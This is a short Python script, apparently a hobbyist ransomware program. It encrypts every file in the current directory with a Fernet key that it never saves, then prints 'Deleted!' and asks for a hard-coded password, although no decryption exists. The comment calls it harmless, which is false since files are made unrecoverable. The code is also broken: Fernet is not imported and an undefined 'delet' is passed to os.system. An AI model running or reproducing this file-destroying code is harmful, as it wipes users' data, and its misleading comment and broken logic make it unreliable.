import os
import time
# Used to encrypt this program (does not harm ur computer... unles u have it in an important folder or directory)

files = []

for file in os.listdir():
	if file == "encrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

# Creating a encrpytionkey that will be used to lock the found files
secretkey = Fernet.generate_key()

# Going through the files list and encrpying everything
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(secretkey).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
   
print("Deleted!")   

time.sleep(5)
# LITERALY THE FUCKING PASSWORD
password = "dycrypt"

os.system(delet)
print("Type ur 'dycrypt' password.")
time.sleep(5)
print("Type password:")
